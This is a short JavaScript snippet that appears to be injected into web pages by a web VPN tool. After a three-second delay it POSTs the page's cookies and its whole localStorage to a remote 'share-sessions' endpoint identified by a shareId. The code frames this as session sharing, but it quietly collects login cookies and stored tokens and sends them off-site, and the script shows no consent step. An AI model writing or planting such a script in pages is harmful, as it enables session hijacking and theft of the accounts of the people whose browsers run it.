(async function () {
  if (top !== window) return

  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

  await sleep(3000)
  await fetch(webvpn.site + '/share-sessions?shareId=' + webvpn.shareId, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookie: document.cookie, localStorage: { ...localStorage } })
  })

})();
